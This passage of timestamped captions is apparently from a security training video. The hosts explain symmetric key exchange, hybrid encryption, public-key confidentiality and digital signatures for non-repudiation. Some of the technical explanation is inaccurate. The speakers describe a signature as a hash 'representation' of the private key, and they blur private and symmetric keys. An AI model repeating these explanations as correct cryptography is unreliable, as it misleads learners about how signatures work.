there.\n\n180\n00:07:59.709 --> 00:08:01.923\nAnd we've got a symmetric key,\n\n181\n00:08:01.923 --> 00:08:06.352\na private key is what we'll just\nsimply refer to it as, in blue.\n\n182\n00:08:06.352 --> 00:08:10.512\nAnd what we see, or what we wanna\nunderstand here with this diagram,\n\n183\n00:08:10.512 --> 00:08:15.122\nis that Alice has to keep her private key,\nher symmetric key confidential.\n\n184\n00:08:15.122 --> 00:08:17.040\nShe has to keep it secure, and so\n\n185\n00:08:17.040 --> 00:08:21.093\nthis is the challenge that we have\nwith symmetric key encryption and\n\n186\n00:08:21.093 --> 00:08:26.090\nsystems built on symmetric exchange, which\nis that we can encrypt and send data.\n\n187\n00:08:26.090 --> 00:08:27.986\nThat's easy to do, right?\n\n188\n00:08:27.986 --> 00:08:30.000\nThe hard part's not the encrypting and\nthe sending.\n\n189\n00:08:30.000 --> 00:08:33.916\nThe hard part is how do we keep the key\nthat un-encrypts and allows Bob,\n\n190\n00:08:33.916 --> 00:08:37.572\nor potentially the attacker,\nwho is trying to surreptitiously,\n\n191\n00:08:37.572 --> 00:08:41.552\nquietly, without any knowledge, or\nanybody knowing, grab that key,\n\n192\n00:08:41.552 --> 00:08:44.514\nas you can see the dotted red line,\nand grab the data.\n\n193\n00:08:44.514 --> 00:08:49.220\nSo he's got to essentially grab both and\nsecret that away so that he or she,\n\n194\n00:08:49.220 --> 00:08:53.627\nwhoever the attacker is, can see and\ndecrypt the data without Alice or\n\n195\n00:08:53.627 --> 00:08:55.400\nBob knowing.\n\n196\n00:08:55.400 --> 00:08:59.476\nSo the problem is really in here\nin this particular solution.\n\n197\n00:08:59.476 --> 00:09:02.416\nThe question that we have to wrestle\nwith is not how does Alice send\n\n198\n00:09:02.416 --> 00:09:04.073\nencrypted data to Bob, but rather,\n\n199\n00:09:04.073 --> 00:09:06.810\nhow does Alice securely communicate\nher private key to Bob?\n\n200\n00:09:06.810 --> 00:09:10.910\n>> Right, cuz with symmetric, I always\nthink of it as same on both sides.\n\n201\n00:09:10.910 --> 00:09:13.634\nSo the key that was used to encrypt-\n>> I like that, same on both sides,\n\n202\n00:09:13.634 --> 00:09:14.253\nthat's awesome.\n\n203\n00:09:14.253 --> 00:09:15.568\n>> Yeah, it's also used to decrypt.\n\n204\n00:09:15.568 --> 00:09:19.790\nSo now Bob needs that key that she\nused to encrypt it in the first place.\n\n205\n00:09:19.790 --> 00:09:20.330\n>> Correct, and\n\n206\n00:09:20.330 --> 00:09:24.660\nso the challenge now becomes how does\nAlice safely send the key to Bob?\n\n207\n00:09:24.660 --> 00:09:27.390\nNow, Alice can send the key\nin a separate message.\n\n208\n00:09:27.390 --> 00:09:28.590\nBut we run the same risk.\n\n209\n00:09:28.590 --> 00:09:32.498\nBecause now we have to encrypt the key\nto send it and transmit it securely.\n\n210\n00:09:32.498 --> 00:09:35.410\nAnd so\nif she encrypts the key with another key,\n\n211\n00:09:35.410 --> 00:09:38.480\nshe has to send that key to Bob\nto un-encrypt the first key.\n\n212\n00:09:38.480 --> 00:09:39.960\n>> That's gonna get a little challenging.\n\n213\n00:09:39.960 --> 00:09:41.410\n>> Right.\n>> Now Alice could say, hey,\n\n214\n00:09:41.410 --> 00:09:42.970\nBob, come on over here.\n\n215\n00:09:42.970 --> 00:09:44.470\nAnd she could whisper in Bob's ear.\n\n216\n00:09:44.470 --> 00:09:49.444\nBut this is not a key that's\nsomething simple like ABC123.\n\n217\n00:09:49.444 --> 00:09:53.846\nWe're talking about a key that's probably\ngot hundreds of alphanumeric characters\n\n218\n00:09:53.846 --> 00:09:56.363\nassociated with it in\na very specific sequence.\n\n219\n00:09:56.363 --> 00:09:58.477\nAnd Bob's probably not\ngonna remember all that.\n\n220\n00:09:58.477 --> 00:10:01.820\nHe's gonna most likely not get it\nright if he has to reproduce it.\n\n221\n00:10:01.820 --> 00:10:04.590\nSo verbal transmission's probably\nnot gonna work real well.\n\n222\n00:10:04.590 --> 00:10:07.790\nPlus, somebody may overhear Alice and\nBob talking, right?\n\n223\n00:10:07.790 --> 00:10:09.850\nThey could do all sorts\nof things to get that.\n\n224\n00:10:09.850 --> 00:10:12.190\nThey could record that conversation.\n\n225\n00:10:12.190 --> 00:10:13.250\nSo that may not work.\n\n226\n00:10:13.250 --> 00:10:17.140\nAlice could try to give Bob the key\nthrough what's called an out of band\n\n227\n00:10:17.140 --> 00:10:19.800\ncommunication or transmission,\nright, where she says,\n\n228\n00:10:19.800 --> 00:10:23.470\nhey Bob, I have this key, and\nI wrote it down on this piece of paper.\n\n229\n00:10:23.470 --> 00:10:27.156\nLet me give it to you before we\nstart exchanging information.\n\n230\n00:10:27.156 --> 00:10:31.151\nBut the problem becomes, of course,\nif Bob leaves the paper somewhere,\n\n231\n00:10:31.151 --> 00:10:32.833\nsomebody is gonna get the key.\n\n232\n00:10:32.833 --> 00:10:38.503\nIf Bob doesn't key in, literally type\nin the key correctly, there may be 256,\n\n233\n00:10:38.503 --> 00:10:44.830\n412, 2,005, whatever the number is,\nthere could be a lot of digits to the key.\n\n234\n00:10:44.830 --> 00:10:48.670\nIf he transposes just one or\nleaves one out, a 0 becomes an o,\n\n235\n00:10:48.670 --> 00:10:50.940\nand we don't pay attention to that, right?\n\n236\n00:10:50.940 --> 00:10:54.680\nThen Bob's not gonna be able to decrypt\nthe message because the key won't work.\n\n237\n00:10:54.680 --> 00:10:57.917\nAnd if Alice sends Bob the key\non a secure medium of some kind,\n\n238\n00:10:57.917 --> 00:11:02.616\nlike maybe, I don't know, let's go old\nschool and hardcore, floppy drives, or\n\n239\n00:11:02.616 --> 00:11:04.484\nbetter yet, a zip drive, right?\n\n240\n00:11:04.484 --> 00:11:07.808\nA zip drive, right, go back to\nthe garbage heap of history for that one.\n\n241\n00:11:07.808 --> 00:11:10.338\n>> [LAUGH]\n>> So if she sends it to him on a zip\n\n242\n00:11:10.338 --> 00:11:14.542\ndrive, then the problem may be that,\nagain, Bob may be able to access it, but\n\n243\n00:11:14.542 --> 00:11:18.460\nif Bob leaves the media around,\nsomebody may pick that key up and get it.\n\n244\n00:11:18.460 --> 00:11:20.500\nSo the problem's really\ngonna be the key exchange.\n\n245\n00:11:20.500 --> 00:11:22.170\n>> And being a symmetric key,\n\n246\n00:11:22.170 --> 00:11:25.550\nshe's probably using that key for\nother encrypted transmissions.\n\n247\n00:11:25.550 --> 00:11:27.000\n>> Like to talk to her other boyfriend.\n\n248\n00:11:27.000 --> 00:11:28.346\n>> Yeah, exactly.\n\n249\n00:11:28.346 --> 00:11:30.781\n>> And so Bob may get jealous, and\nyeah, that could be a problem.\n\n250\n00:11:30.781 --> 00:11:31.308\n>> Yeah, and\n\n251\n00:11:31.308 --> 00:11:35.240\nnow the bad guy has her key and\ngets access to everything she's encrypted.\n\n252\n00:11:35.240 --> 00:11:36.320\n>> Correct, very true.\n\n253\n00:11:36.320 --> 00:11:38.070\nSo that could also be an issue.\n\n254\n00:11:38.070 --> 00:11:40.760\nSo while we like symmetric encryption and\n\n255\n00:11:40.760 --> 00:11:43.530\nwhile we like the idea\nthat this is possible,\n\n256\n00:11:43.530 --> 00:11:47.240\nwe may struggle with the implementation\nof how to transmit the key securely.\n\n257\n00:11:47.240 --> 00:11:48.740\nNow symmetric algorithms and\n\n258\n00:11:48.740 --> 00:11:53.390\nsymmetric encryption has a very\nimportant place in what we do.\n\n259\n00:11:53.390 --> 00:11:57.735\nSymmetric algorithms are very fast,\nlightning fast, by comparison to\n\n260\n00:11:57.735 --> 00:12:02.360\nasymmetric algorithms, which are good, but\nare much slower, because we're dealing\n\n261\n00:12:02.360 --> 00:12:06.350\nwith essentially two keys as opposed to\none, and they operate at a slower rate.\n\n262\n00:12:06.350 --> 00:12:10.013\nNow slow is relative, you're not gonna\nsit there, necessarily understand\n\n263\n00:12:10.013 --> 00:12:14.203\nthe difference for something small, but if\nyou're encrypting large volumes of data.\n\n264\n00:12:14.203 --> 00:12:18.132\nWe've talked a lot in prior episodes\nabout the need for encryption,\n\n265\n00:12:18.132 --> 00:12:21.383\non the wire encryption at\nthe application point of use and\n\n266\n00:12:21.383 --> 00:12:24.410\nencryption at rest,\ndata in storage, right?\n\n267\n00:12:24.410 --> 00:12:28.570\nIf we're gonna encrypt a terabyte of data\nthat's sitting on a storage area network\n\n268\n00:12:28.570 --> 00:12:32.190\nfor the hard drives of the virtual\nmachines and all the config files and all\n\n269\n00:12:32.190 --> 00:12:37.160\nthat, we wanna encrypt all that in a Cloud\nscenario, and we use symmetric encryption.\n\n270\n00:12:37.160 --> 00:12:39.120\nIt's realistic and doable.\n\n271\n00:12:39.120 --> 00:12:41.420\nIf we use asymmetric encryption,\nit's realistic, but\n\n272\n00:12:41.420 --> 00:12:43.360\nit's gonna take a lot longer.\n\n273\n00:12:43.360 --> 00:12:46.450\nAnd so what we often do,\nwe'll see this documented a little later,\n\n274\n00:12:46.450 --> 00:12:52.440\nis we're gonna symmetrically encrypt bulk\nvolumes of data, take that symmetric key,\n\n275\n00:12:52.440 --> 00:12:57.060\nasymmetrically encrypt the symmetric key,\nwhich then solves the problem of key\n\n276\n00:12:57.060 --> 00:13:01.550\ntransmission because the key itself is\na very small amount of data by comparison.\n\n277\n00:13:01.550 --> 00:13:05.530\nSo we can asymmetrically encrypt that,\nsend the asymmetrically encrypted\n\n278\n00:13:05.530 --> 00:13:08.770\nsymmetric key securely\ncuz now we can do that.\n\n279\n00:13:08.770 --> 00:13:12.755\nHave somebody unencrypt the asymmetrically\nencrypted symmetric key.\n\n280\n00:13:12.755 --> 00:13:13.740\n>> [LAUGH]\n>> And then use\n\n281\n00:13:13.740 --> 00:13:16.270\nthe symmetric key to unencrypt\nthe data when they need it.\n\n282\n00:13:16.270 --> 00:13:19.140\n>> Yeah.\n>> Thus sending the key confidentially\n\n283\n00:13:19.140 --> 00:13:22.300\nwithout worrying about\nexposing it at the same time.\n\n284\n00:13:22.300 --> 00:13:25.570\nSo we'll talk about how that works and\nsee that a little later on.\n\n285\n00:13:25.570 --> 00:13:27.730\nNotice I went slow for\nthat, so I got that right.\n\n286\n00:13:27.730 --> 00:13:31.370\nCuz last time I ran through that quickly,\nI think we wound up in Beijing\n\n287\n00:13:31.370 --> 00:13:34.990\nhaving tea as opposed to unencrypting\nbecause we went off on a tangent,\n\n288\n00:13:34.990 --> 00:13:36.160\nnothing worked the right way.\n\n289\n00:13:36.160 --> 00:13:37.740\nAll right, so this is symmetric.\n\n290\n00:13:37.740 --> 00:13:39.460\nSo let's take a look at asymmetric.\n\n291\n00:13:39.460 --> 00:13:40.355\nWe have that one up there today.\n\n292\n00:13:40.355 --> 00:13:42.090\nAll right,\nlet's take a look at asymmetric.\n\n293\n00:13:42.090 --> 00:13:45.307\nMichael just resized a little\nbit while we're talking.\n\n294\n00:13:45.307 --> 00:13:46.778\nSo now we're gonna do asymmetric.\n\n295\n00:13:46.778 --> 00:13:48.870\nThis is public private key pairs.\n\n296\n00:13:48.870 --> 00:13:53.760\nSo every participant in the system,\nwith the exception of our attacker, right,\n\n297\n00:13:53.760 --> 00:13:57.070\ncuz clearly, we don't really care\nabout he or she, and more importantly,\n\n298\n00:13:57.070 --> 00:13:58.330\nwe don't want them to have a key.\n\n299\n00:13:58.330 --> 00:13:59.820\nSo they get nothing, right?\n\n300\n00:13:59.820 --> 00:14:03.650\nBut certainly, Alice and Bob,\nwho are gonna be active and real and\n\n301\n00:14:03.650 --> 00:14:08.550\nvalid participants in our exchange,\nboth have public and private keys, right?\n\n302\n00:14:08.550 --> 00:14:12.300\nNow we're gonna see the public keys\nare green, we're gonna just say for\n\n303\n00:14:12.300 --> 00:14:13.980\nour discussion, right?\n\n304\n00:14:13.980 --> 00:14:16.900\nAnd then the red keys are gonna\nbe the private or symmetric keys,\n\n305\n00:14:16.900 --> 00:14:18.160\nthe private keys, right?\n\n306\n00:14:18.160 --> 00:14:19.690\nSo we have a public private key pair.\n\n307\n00:14:19.690 --> 00:14:23.550\nSo Alice has hers on the left,\nBob has his on the right.\n\n308\n00:14:23.550 --> 00:14:27.470\nAlice is trying to send Bob\na piece of information,\n\n309\n00:14:27.470 --> 00:14:31.300\nthe green text this time,\nsend it securely, unidirectionally.\n\n310\n00:14:31.300 --> 00:14:36.515\nAnd she wants to send that to Bob,\nand she wants to be able to send it.\n\n311\n00:14:36.515 --> 00:14:39.335\nAnd she wants to send it securely, right?\n\n312\n00:14:39.335 --> 00:14:39.845\nIn other words,\n\n313\n00:14:39.845 --> 00:14:44.625\nshe wants to encrypt the transmission,\nprovide confidentiality protection.\n\n314\n00:14:44.625 --> 00:14:48.400\nAnd that way, when we send the message,\nthe attacker is not able to read it.\n\n315\n00:14:48.400 --> 00:14:54.760\nIt's very important we distinguish here,\nright?\n\n316\n00:14:54.760 --> 00:14:55.285\nWe be clear.\n\n317\n00:14:55.285 --> 00:14:57.818\n>> [LAUGH]\n>> Unequivocal is what I was thinking.\n\n318\n00:14:57.818 --> 00:15:01.696\nWe have to be clear about what the\nattacker is gonna be able to see versus\n\n319\n00:15:01.696 --> 00:15:06.130\nwhat the attacker is able to do with\nwhat they see in this discussion right?\n\n320\n00:15:06.130 --> 00:15:09.010\nThe attacker may very well\nbe able to siphon off\n\n321\n00:15:09.010 --> 00:15:11.470\nthe encrypted bits of the message,\nand that's okay.\n\n322\n00:15:11.470 --> 00:15:14.720\nWe may or may not worry about that, but\nthe reality is we're not worried about\n\n323\n00:15:14.720 --> 00:15:17.980\nthem seeing the encrypted data stream,\nwe're worried about them taking\n\n324\n00:15:17.980 --> 00:15:22.050\nthe encrypted data stream and decrypting\nit through access to one of the keys.\n\n325\n00:15:22.050 --> 00:15:23.080\nSo we don't care,\n\n326\n00:15:23.080 --> 00:15:27.340\nwith confidentiality protections,\nabout the attacker seeing the data.\n\n327\n00:15:27.340 --> 00:15:28.840\nBecause the data's encrypted.\n\n328\n00:15:28.840 --> 00:15:30.550\nI mean, we do care, let me be clear.\n\n329\n00:15:30.550 --> 00:15:32.450\nYou don't want the attacker\nto get the data.\n\n330\n00:15:32.450 --> 00:15:34.080\nBut my point is if they got it,\n\n331\n00:15:34.080 --> 00:15:37.350\nwe wouldn't feel that\nconfidentiality had been violated.\n\n332\n00:15:37.350 --> 00:15:39.970\nBecause the encryption is\nstill attached to the data.\n\n333\n00:15:39.970 --> 00:15:43.131\nAs long as the key that decrypts\nthe data is kept secure,\n\n334\n00:15:43.131 --> 00:15:44.957\nthe attacker can have the data.\n\n335\n00:15:44.957 --> 00:15:48.716\nWe obviously, at some point, will say\nthat may be a problem, because maybe\n\n336\n00:15:48.716 --> 00:15:52.272\nthe attacker can guess the key, and\nwe don't want them to get the data.\n\n337\n00:15:52.272 --> 00:15:54.091\nSo, we wanna try to take\nsteps to prevent that.\n\n338\n00:15:54.091 --> 00:15:58.358\nBut for purposes of our discussion,\nas long as the data is kept secure.\n\n339\n00:15:58.358 --> 00:16:01.180\nWhen it's transmitted and\nthe key is not compromised,\n\n340\n00:16:01.180 --> 00:16:03.646\nwe consider that successful\nin our discussion.\n\n341\n00:16:03.646 --> 00:16:08.280\nSo Alice is gonna send the message\nto Bob and here's the question.\n\n342\n00:16:08.280 --> 00:16:10.220\nHow does Alice send it securely?\n\n343\n00:16:10.220 --> 00:16:14.798\nApply confidentiality protection\nto it without necessarily allowing\n\n344\n00:16:14.798 --> 00:16:18.580\nthe attacker not just without necessarily,\nright?\n\n345\n00:16:18.580 --> 00:16:21.589\nOkay, how does she do that without\nallowing the attacker to see the message\n\n346\n00:16:21.589 --> 00:16:22.270\nand get the key.\n\n347\n00:16:22.270 --> 00:16:23.780\nSo what key are we gonna use?\n\n348\n00:16:23.780 --> 00:16:27.180\n>> Well, you might think you would use\nyour own key, but then that's gonna pose\n\n349\n00:16:27.180 --> 00:16:30.960\na problem cuz you still have to transmit\nthe other key to do the decryption.\n\n350\n00:16:30.960 --> 00:16:34.042\nSo instead,\nwe're gonna go get Bob's public key.\n\n351\n00:16:34.042 --> 00:16:36.570\n>> All right, so\nas we can see at the top there, right,\n\n352\n00:16:36.570 --> 00:16:38.370\nthe white arrow that's pointing to it.\n\n353\n00:16:38.370 --> 00:16:43.210\nBob's public key has been used or\nat least Alice has gotten access too,\n\n354\n00:16:43.210 --> 00:16:45.160\nwe'll talk about how she\ndoes that in a minute.\n\n355\n00:16:45.160 --> 00:16:48.020\nAnd she's gonna use Bob's public key or\n\n356\n00:16:48.020 --> 00:16:53.410\nthe sender uses the recipient's public key\ngenerically just to keep it simple, right?\n\n357\n00:16:53.410 --> 00:16:57.890\nThe sender uses the recipient's\npublic key to encrypt the message.\n\n358\n00:16:57.890 --> 00:17:00.960\nNow, where do we get\nthe recipient's public key from?\n\n359\n00:17:00.960 --> 00:17:06.100\nWell, we hopefully know from our prior\nepisode's discussion that the public key\n\n360\n00:17:06.100 --> 00:17:09.920\nis maintained in the directory\nservices servers most likely.\n\n361\n00:17:09.920 --> 00:17:12.150\nSo in domain controllers, in open LDAP,\n\n362\n00:17:12.150 --> 00:17:15.030\nit'll be on whatever\nthe directory controller is.\n\n363\n00:17:15.030 --> 00:17:18.600\nThere may be a system like PGP for\ninstance, or\n\n364\n00:17:18.600 --> 00:17:22.760\na commercial variant of PGP,\nthere are freeware versions out open.\n\n365\n00:17:22.760 --> 00:17:27.270\nPGP and things like that that\nare available, cuz once you sell\n\n366\n00:17:27.270 --> 00:17:30.090\nthe freeware and somebody buys it,\nyou gotta create another one.\n\n367\n00:17:30.090 --> 00:17:32.190\nRight, so, whatever you use,\n\n368\n00:17:32.190 --> 00:17:35.600\nthere are key servers that are out\nthere that list the public keys.\n\n369\n00:17:35.600 --> 00:17:38.640\nAnd essentially are available\nthrough the Internet or whatever.\n\n370\n00:17:38.640 --> 00:17:43.600\nSo Alice can go look up and\ndownload Bob's public key in some way.\n\n371\n00:17:43.600 --> 00:17:48.340\nWhen she gets that,\nshe uses that in her encryption enabled or\n\n372\n00:17:48.340 --> 00:17:52.530\nwhatever her email program\nis that uses encryption.\n\n373\n00:17:52.530 --> 00:17:56.640\nShe chooses to go ahead and encrypt,\nso she will pull in the public key.\n\n374\n00:17:56.640 --> 00:18:01.780\nThe key is assigned to the message and\nwe use the key to encrypt the data.\n\n375\n00:18:01.780 --> 00:18:06.730\nOnce we've done that and Alice hits Send,\nthe only key that can correspond to\n\n376\n00:18:06.730 --> 00:18:11.240\nBob's or the recipient's public key is\nthe recipient's private key in red.\n\n377\n00:18:11.240 --> 00:18:12.310\nAnd as a result of that,\n\n378\n00:18:12.310 --> 00:18:17.170\nas long as Bob keeps his key secure,\ndoesn't let the attacker see it.\n\n379\n00:18:17.170 --> 00:18:21.630\nThen the only person that should be able\nto decrypt that message would be Bob.\n\n380\n00:18:21.630 --> 00:18:24.105\nNow we assume and\nwe have to make some assumptions here,\n\n381\n00:18:24.105 --> 00:18:25.835\neven though we always\nsay assumptions are bad.\n\n382\n00:18:26.965 --> 00:18:29.985\nWe have to assume that Bob's private key,\n\n383\n00:18:29.985 --> 00:18:33.065\nthe recipient's private key,\nhas been kept secure.\n\n384\n00:18:33.065 --> 00:18:36.340\nThere isn't a copy made\nseriptitiously by the attacker.\n\n385\n00:18:36.340 --> 00:18:39.110\nThe attacker doesn't\nassume Bob's identity.\n\n386\n00:18:39.110 --> 00:18:42.160\nThere definitely are ways that\nthe attacker could break the system.\n\n387\n00:18:42.160 --> 00:18:43.650\nLet's be clear about that, right?\n\n388\n00:18:43.650 --> 00:18:49.550\nBut the reality is as long as the attacker\ndoesn't have access to Bob's credentials.\n\n389\n00:18:49.550 --> 00:18:51.980\nAnd doesn't have a copy\nof Bob's private key,\n\n390\n00:18:51.980 --> 00:18:54.360\nthe attacker cannot\ncompromise the exchange.\n\n391\n00:18:54.360 --> 00:18:56.510\n>> Right.\n>> That's what's important to know.\n\n392\n00:18:56.510 --> 00:19:00.690\nOkay, so when we send confidentially\nin an asymmetric system,\n\n393\n00:19:00.690 --> 00:19:04.930\nthe sender must get a copy of\nthe recipient's public key.\n\n394\n00:19:04.930 --> 00:19:09.420\nAnd use that public key to drive\nthe encrypted transmission.\n\n395\n00:19:09.420 --> 00:19:10.730\nOkay, that's what we wanna know.\n\n396\n00:19:10.730 --> 00:19:12.770\nAll right, so we have symmetric and\nasymmetric there.\n\n397\n00:19:12.770 --> 00:19:14.265\nWhat do we have up next?\n\n398\n00:19:14.265 --> 00:19:15.620\nCuz you're driving with the tabs,\nI can't see.\n\n399\n00:19:15.620 --> 00:19:19.084\n>> Lets see, wanna do some proof of\norigin or some confidential usage?\n\n400\n00:19:19.084 --> 00:19:19.584\n>> Sure, lets do proof.\n\n401\n00:19:19.584 --> 00:19:23.330\nNo, no, yeah, lets do proof of origin and\nthen we'll do that, no problem.\n\n402\n00:19:23.330 --> 00:19:27.580\nAll right, so proof of origin, proof\nof origin is going to allow us again,\n\n403\n00:19:27.580 --> 00:19:31.720\nwe see Alice on the left,\nwe see Bob over there on the right.\n\n404\n00:19:31.720 --> 00:19:34.320\nAlice is trying to send\na message over to Bob, but\n\n405\n00:19:34.320 --> 00:19:37.250\nwe're not trying to send\nthe message with confidentiality.\n\n406\n00:19:37.250 --> 00:19:39.330\nWe're not trying to encrypt the message,\n\n407\n00:19:39.330 --> 00:19:42.985\nkeep it away from the attacker\nin a proof of origin.\n\n408\n00:19:42.985 --> 00:19:45.540\nRight, send or a proof for our scenario.\n\n409\n00:19:45.540 --> 00:19:47.640\nWe don't care if the attackers\nsees the message,\n\n410\n00:19:47.640 --> 00:19:49.700\nbecause we're not trying\nto hide the message.\n\n411\n00:19:49.700 --> 00:19:54.900\nWhat we care about is that Alice's\nidentity is validated and that Alice\n\n412\n00:19:54.900 --> 00:19:59.970\nis seen as being the official sender of\nthat message beyond a reasonable doubt.\n\n413\n00:19:59.970 --> 00:20:02.590\n>> That is that big fancy\nterm non-repudiation.\n\n414\n00:20:02.590 --> 00:20:05.235\n>> Non-repudiation and\nproof of origin, right?\n\n415\n00:20:05.235 --> 00:20:07.960\nNon-repudiation is I can't\ndeny having done it, right?\n\n416\n00:20:07.960 --> 00:20:09.100\nBig fancy term.\n\n417\n00:20:09.100 --> 00:20:12.690\nProof of origin,\nwe know beyond a reasonable doubt that\n\n418\n00:20:12.690 --> 00:20:16.800\nit came from this individual\nusing these particular tools.\n\n419\n00:20:16.800 --> 00:20:20.125\nAnd so what we're doing here is\nwe're trying to figure out how\n\n420\n00:20:20.125 --> 00:20:22.705\nAlice can send this message to Bob.\n\n421\n00:20:22.705 --> 00:20:26.605\nAnd prove to Bob that she is\nthe one that actually did the send,\n\n422\n00:20:26.605 --> 00:20:28.445\nthat's the goal, right?\n\n423\n00:20:28.445 --> 00:20:32.865\nAnd so when we wanna provide an integrity\nmechanism like proof of origin or\n\n424\n00:20:32.865 --> 00:20:34.100\nnon-repudiation.\n\n425\n00:20:34.100 --> 00:20:35.120\nWhich is what it is,\n\n426\n00:20:35.120 --> 00:20:39.515\nas opposed to a confidentiality mechanism\nwhich is gonna encrypt the message.\n\n427\n00:20:39.515 --> 00:20:41.680\nThen we have to think about\nthis slightly differently,\n\n428\n00:20:41.680 --> 00:20:45.800\nbecause when we send a message in\nan asymmetric system securely with\n\n429\n00:20:45.800 --> 00:20:49.040\nconfidentiality protections\nas we just talked about.\n\n430\n00:20:49.040 --> 00:20:52.671\nThe sender has to get\nthe recipients public key, right?\n\n431\n00:20:52.671 --> 00:20:56.095\nAnd use the recipient's public\nkey in order to be able\n\n432\n00:20:56.095 --> 00:21:00.990\nto securely send matching it to the\nrecipients private key for the decrypt.\n\n433\n00:21:00.990 --> 00:21:05.130\nBut when we're going to prove who we are,\nwe can't use the recipient's\n\n434\n00:21:05.130 --> 00:21:08.000\npublic key cuz the recipient is\nnot who we're trying to prove.\n\n435\n00:21:08.000 --> 00:21:10.010\n>> And anybody can get\nthe recipient's public key.\n\n436\n00:21:10.010 --> 00:21:10.730\n>> Anybody can get that.\n\n437\n00:21:10.730 --> 00:21:12.930\n>> A public key, so\nit's not proving anything.\n\n438\n00:21:12.930 --> 00:21:16.310\n>> Right, and our public key, the sender's\npublic key is also in the same boat.\n\n439\n00:21:16.310 --> 00:21:18.158\nAs I said, anybody can get it.\n\n440\n00:21:18.158 --> 00:21:21.870\nSo we have to use a private key and this\nis where a lot of people get confused.\n\n441\n00:21:21.870 --> 00:21:24.840\nBecause we're saying you gotta keep\nthat private key secure all the time,\n\n442\n00:21:24.840 --> 00:21:25.340\nharping on it.\n\n443\n00:21:25.340 --> 00:21:26.920\nNever show it to anybody.\n\n444\n00:21:26.920 --> 00:21:29.570\nBut now all of the sudden,\nwe're about to use a private key.\n\n445\n00:21:29.570 --> 00:21:32.950\nAnd specifically we're about to\nuse the sender's private key.\n\n446\n00:21:32.950 --> 00:21:35.090\nCuz we don't use the sender's private key,\n\n447\n00:21:35.090 --> 00:21:38.140\nthen the problem is we are proving\nthe origination point.\n\n448\n00:21:38.140 --> 00:21:40.575\nWe're proving the identity of\nthe recipient if we use their key.\n\n449\n00:21:40.575 --> 00:21:43.391\nWhich they already know,\nso Bob is Bob, right?\n\n450\n00:21:43.391 --> 00:21:46.960\nSo as a result, Bob doesn't need\nto know that he is Bob, right?\n\n451\n00:21:46.960 --> 00:21:48.510\nCuz there's only one Bob,\nbecause Bob's [INAUDIBLE].\n\n452\n00:21:48.510 --> 00:21:51.270\n>> Maybe more than one personality but\nonly one physical Bob.\n\n453\n00:21:51.270 --> 00:21:54.340\n>> Well yeah, we have medication for\nthat, so that's not a problem.\n\n454\n00:21:54.340 --> 00:21:59.430\nRight, so Alice has to use her\nprivate key to validate her identity.\n\n455\n00:21:59.430 --> 00:22:01.190\nRemember, private keys are kept secure.\n\n456\n00:22:01.190 --> 00:22:03.400\nThe only person that should\nbe able to use them,\n\n457\n00:22:03.400 --> 00:22:07.160\nunless there's been some sort of\nmalfeasance in the system, is Alice.\n\n458\n00:22:07.160 --> 00:22:10.080\nAnd again, we make assumptions and\nI wanna be clear about this, right?\n\n459\n00:22:10.080 --> 00:22:11.820\nYou would just throw this\nstuff out there casually and\n\n460\n00:22:11.820 --> 00:22:13.540\nsay yeah, Alice used her private key.\n\n461\n00:22:13.540 --> 00:22:15.060\nBelieve it or not, everything is good.\n\n462\n00:22:15.060 --> 00:22:18.760\n>> Yeah, as long as the attacker\ndoesn't steal Alice's private key.\n\n463\n00:22:18.760 --> 00:22:23.310\nAs long as the attacker doesn't assume\nher identity and that can happen.\n\n464\n00:22:23.310 --> 00:22:25.170\nBut we're not talking\nabout that right now,\n\n465\n00:22:25.170 --> 00:22:28.120\nwe're just light up the concept and\nhow this should work.\n\n466\n00:22:28.120 --> 00:22:31.930\nIn the real world, we know we have to take\nadditional steps to defend against that.\n\n467\n00:22:31.930 --> 00:22:34.648\nAnd we have to make sure that\nAlice's identity is kept secure.\n\n468\n00:22:34.648 --> 00:22:39.360\nWe use multi-factor authentication and\nwe use physical security to\n\n469\n00:22:39.360 --> 00:22:42.740\nprevent the attacker from gaining access\nto the network in the first place and\n\n470\n00:22:42.740 --> 00:22:44.740\nassuming Alice's identity, right?\n\n471\n00:22:44.740 --> 00:22:46.335\nAnd if all else fails,\nyou kill the attacker.\n\n472\n00:22:46.335 --> 00:22:48.222\n>> [LAUGH] We can do that.\n\n473\n00:22:48.222 --> 00:22:49.545\n>> Electrify the keyboard, right?\n\n474\n00:22:49.545 --> 00:22:50.167\n>> [LAUGH]\n>> And\n\n475\n00:22:50.167 --> 00:22:52.556\nthen just the attacker goes up in smoke,\nright?\n\n476\n00:22:52.556 --> 00:22:55.350\nSo obviously we can defend against that,\nright?\n\n477\n00:22:55.350 --> 00:22:57.473\nKeyboard 3000 or something like that.\n\n478\n00:22:57.473 --> 00:23:00.335\n>> [LAUGH]\n>> What was that thing in Robocop where\n\n479\n00:23:00.335 --> 00:23:03.128\n>> The electric unit or motor?\n\n480\n00:23:03.128 --> 00:23:08.446\n>> Yeah, the perfect car alarm,\nwhere the guy gets in and the Robovolt or\n\n481\n00:23:08.446 --> 00:23:13.242\nsomething like that,\nRobovolt 3000 fries him to a crisp.\n\n482\n00:23:13.242 --> 00:23:17.167\nThe guy opens the door and the body falls\nout and then he just drives away and\n\n483\n00:23:17.167 --> 00:23:19.180\nit doesn't even drain the battery.\n\n484\n00:23:19.180 --> 00:23:19.840\n>> He drives away.\n\n485\n00:23:19.840 --> 00:23:20.485\n>> That is perfect.\n\n486\n00:23:20.485 --> 00:23:26.860\n>> That's what we need, we need\nRobovolt or Keyvolt 3000 or whatever.\n\n487\n00:23:26.860 --> 00:23:29.110\nAnyway, I digress, let's get back\nto what we were talking about.\n\n488\n00:23:29.110 --> 00:23:33.940\nSo we're gonna use Alice's private key in\norder to send this message with proof of\n\n489\n00:23:33.940 --> 00:23:36.323\norigin and non-repudiation, right?\n\n490\n00:23:36.323 --> 00:23:41.134\nSo Alice is gonna digitally\nsign using this private key,\n\n491\n00:23:41.134 --> 00:23:44.140\ndigitally sign this message.\n\n492\n00:23:44.140 --> 00:23:46.030\nAnd you can see there\nunderneath the message,\n\n493\n00:23:46.030 --> 00:23:48.360\nAlice's private key is being used, right?\n\n494\n00:23:49.600 --> 00:23:51.835\nAlice signs, sends the message.\n\n495\n00:23:51.835 --> 00:23:54.343\nNow we don't really send\nAlice's private key.\n\n496\n00:23:54.343 --> 00:23:58.918\nWe send out cryptographic representation\nof Alice's private key which is\n\n497\n00:23:58.918 --> 00:24:01.105\ncommonly what we refer to as a hash.\n\n498\n00:24:01.105 --> 00:24:03.703\nYour message digest in\nthe case of the signature.\n\n499\n00:24:03.703 --> 00:24:08.836\nAnd so we're gonna send a representation\nof her key, keeping her key secure.\n\n500\n00:24:08.836 --> 